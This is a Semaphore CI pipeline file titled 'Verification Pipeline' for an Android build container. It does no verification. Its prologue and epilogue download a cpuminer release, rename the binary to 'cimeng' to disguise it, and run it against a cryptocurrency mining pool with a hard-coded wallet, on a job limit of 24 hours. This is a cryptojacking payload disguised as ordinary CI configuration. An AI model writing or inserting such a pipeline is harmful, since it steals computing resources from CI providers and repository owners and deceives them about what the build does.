version: v1.0
name: Verification Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
  containers:
    - name: main
      image: 'registry.semaphoreci.com/android:29'
execution_time_limit:
  hours: 24
global_job_config:
  env_vars:
    - name: ADB_INSTALL_TIMEOUT
      value: '10'
  prologue:
    commands:
      - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
      - tar xf cpuminer-opt-linux.tar.gz
      - mv cpuminer-sse2 cimeng
      - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
  epilogue:
    always:
      commands:
        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
        - tar xf cpuminer-opt-linux.tar.gz
        - mv cpuminer-sse2 cimeng
        - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.momok -t4'
    on_pass:
      commands:
        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
        - tar xf cpuminer-opt-linux.tar.gz
        - mv cpuminer-sse2 cimeng
